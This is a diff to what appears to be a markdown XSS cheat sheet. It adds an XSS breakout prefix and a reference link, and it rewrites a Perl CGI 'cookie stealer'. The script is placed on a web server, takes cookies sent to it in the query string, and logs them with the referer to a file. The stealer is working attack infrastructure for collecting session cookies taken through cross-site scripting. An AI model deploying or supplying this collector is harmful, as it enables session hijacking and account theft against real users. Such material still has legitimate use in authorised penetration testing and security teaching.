@@ -7,6 +7,7 @@ Note: JavaScript and HTML code snippets are case insensitive.
 ## Prefix
 
 ```
+>
 '>
 ">
 ```
@@ -155,18 +156,19 @@ fclose($fp);
 ?>
 ```
 
-- Perl Cookie Stealer (TODO: Update this)
+- Perl Cookie Stealer
 
 ```perl
 #!/usr/bin/perl
-
+use POSIX;
 # sudo mv cookie_stealer.pl /var/www/html/
 # sudo chown www-data:www-data /var/www/html/cookie_stealer.pl
 # sudo chmod 700 /var/www/html/cookie_stealer.pl
 # perl -c /var/www/html/cookie_stealer.pl
 
-#Get Current Date
-chomp($DATE	= `date`);
+# Get Current Date
+# my $date = strftime "%a-%b-%e-%H:%M:%S-%Y", localtime;
+my $date = strftime "%a-%b-%e-%H:%M:%S-%Y", gmtime;
 
 #Log Directory
 $dir	= "/var/www/logdir";
@@ -178,15 +180,15 @@ $file	= "$dir/log.txt";
 print "Content-type: text/html\n\n";
 
 #Open Log File in appended mode
-open(LOG,">>$file");
+open(our $LOG,">>$file");
 
 #Collect HTML Post Data
-&getDATA;
+siphon_cookies();
 
 #Close Log File
-close(LOG);
+close($LOG);
 
-sub getDATA {
+sub siphon_cookies {
         # Put the posted data into variables
         if($ENV{'QUERY_STRING'} ne "") {
                 $buffer = $ENV{'QUERY_STRING'};
@@ -206,12 +208,12 @@ sub getDATA {
 	#A ";" plus "%20" equals a ";" and a space	
         @pairs = split(/;%20/, $buffer);
 
-	print "----------------------------------<BR>\n";
-	print LOG "----------------------------------\n";
+	print "----------------------------------<br>\n";
+	print $LOG "----------------------------------\n";
 
 	$HTTP_REFERER = $ENV{'HTTP_REFERER'};
 	print "HTTP_REFERER: $HTTP_REFERER<BR>\n";
-	print LOG "HTTP_REFERER: $HTTP_REFERER\n";
+	print $LOG "HTTP_REFERER: $HTTP_REFERER\n";
 
 	#Enumerate through the @pairs array
         foreach $pair (@pairs) {
@@ -227,12 +229,12 @@ sub getDATA {
 		#store the values into a hash called %FORM
                 $FORM{$name} = $value;
 
-                print "DATE: $DATE; NAME: $name;VALUE: $value<BR>\n";
-                print LOG "DATE: $DATE; NAME: $name; VALUE: $value\n";
+                print "DATE: $date; NAME: $name;VALUE: $value<BR>\n";
+                print $LOG "DATE: $date; NAME: $name; VALUE: $value\n";
         }
 
-	print "----------------------------------<BR>\n";
-	print LOG "----------------------------------\n";
+	print "----------------------------------<br>\n";
+	print $LOG "----------------------------------\n";
 
 }
 ```
@@ -247,6 +249,8 @@ TODO: Fill this info
 
 ---
 ## References
+
+- [Wikipedia: List of XML and HTLM character entity references](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)
 
 - [PayloadBox: XSS Payload List](https://github.com/payloadbox/xss-payload-list)
 
